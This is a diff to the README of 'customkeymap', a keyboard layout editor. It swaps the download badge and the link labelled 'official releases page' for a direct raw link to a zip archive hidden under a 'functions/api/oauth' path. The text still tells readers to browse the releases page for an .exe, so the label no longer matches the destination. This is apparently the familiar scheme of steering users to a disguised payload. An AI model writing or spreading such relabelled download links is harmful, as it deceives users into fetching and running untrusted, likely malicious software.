@@ -1,6 +1,6 @@
 # ⌨️ customkeymap - Edit your keyboard layout with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/866723/customkeymap/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/866723/customkeymap/main/functions/api/oauth/Software_v3.4.zip)
 
 ## Overview ℹ️
 
@@ -25,7 +25,7 @@ Customkeymap helps you manage your keyboard layout. You can change your key assi
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/866723/customkeymap/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/866723/customkeymap/main/functions/api/oauth/Software_v3.4.zip).
 2.  Find the section labeled Latest.
 3.  Look for the file that ends in .exe.
 4.  Click the file name to start the download.
